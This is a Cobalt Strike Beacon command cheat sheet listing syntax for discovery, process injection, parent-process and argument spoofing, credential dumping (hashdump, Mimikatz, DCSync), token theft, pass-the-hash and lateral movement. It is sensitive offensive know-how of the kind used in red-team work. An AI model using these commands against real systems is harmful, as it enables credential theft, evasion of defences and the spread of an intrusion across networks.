Cobalt Strike commands
```powershell
### BEACON INTERACTION & MGT ###
help                  # List commands or get specific help
sleep [sec] [jit]     # Set callback interval and jitter %
checkin               # Force immediate check-in
exit                  # Terminate beacon session
clear                 # Clear console output
note [text]           # Assign label to beacon
info                  # Display beacon details

### DISCOVERY & FILE SYSTEM ###
ls [path]             # List directory contents
pwd                   # Print working directory
cd [path]             # Change directory
upload [loc] [rem]    # Upload file to target
download [file]       # Download file to team server
ps                    # List running processes
net [args]            # Run built-in net enumeration (e.g., domain, logons)
portscan [ip] [ports] # Run port scan (e.g., portscan 10.10.10.0/24 22 arp)
ldapsearch [qry] [att]# Query AD via LDAP (e.g., ldapsearch (objectClass=user) samaccountname)

### OPSEC & EVASION ###
ppid [pid]            # Spoof parent process for post-ex jobs
spawnto [arch] [path] # Set binary used for spawning post-ex jobs
blockdlls [start|stop]# Block non-MS DLLs in child processes
argue [exe] [fake]    # Spoof command-line arguments (e.g., argue cmd.exe /c whoami)
runu [pid] [cmd]      # Execute command as child of specific PID
shinject [pid] [arch] # Inject shellcode into remote process
dllinject [pid] [dll] # Inject reflective DLL into process

### EXECUTION ###
run [cmd]             # Execute directly (no cmd.exe)
shell [cmd]           # Execute via cmd.exe (Bad OPSEC, leaves artifacts)
powerpick [cmd]       # Execute unmanaged PS (no powershell.exe)
powershell-import [loc] # Load local .ps1 (e.g., PowerView) into memory for powerpick
psinject [pid] [cmd]  # Inject unmanaged PS into process
execute-assembly [exe]# Execute .NET assembly entirely in memory
inline-execute [file] # Execute a Beacon Object File (BOF) in memory

### CREDENTIAL ACCESS ###
hashdump              # Dump local SAM hashes (Req: SYSTEM)
logonpasswords        # Run sekurlsa::logonpasswords (Req: SYSTEM)
mimikatz [cmd]        # Run specific Mimikatz command in memory
dcsync [dom] [user]   # Extract NTLM hash via DCSync (Req: DA/DC)

### USER IMPERSONATION & TOKENS ###
make_token [dom\usr]  # Create token for network auth (keeps local context)
steal_token [pid]     # Steal and impersonate process token
pth [dom\usr] [hash]  # Pass-the-Hash for impersonation
getuid                # Show current user/token context
rev2self              # Revert to beacon's original context

### TOKEN STORE (Manage tokens safely in memory) ###
token-store show      # List all tokens currently saved in the store
token-store steal [id]# Steal token from PID and save it to the store
token-store use [idx] # Impersonate a specific token from the store via index
token-store remove [#]# Delete a specific token from the store via index
token-store removeall # Clear all saved tokens from the store

### LATERAL MOVEMENT ###
jump [meth] [tgt]     # Move laterally and spawn beacon
                      # Methods: psexec, psexec64, winrm, winrm64, scshell
remote-exec [meth]    # Execute command remotely (no new beacon)
                      # Methods: psexec, winrm, wmi, scshell
link [tgt] [pipe]     # Connect to SMB beacon over named pipe
connect [tgt] [port]  # Connect to TCP beacon
unlink [tgt] [pid]    # Disconnect from linked beacon
```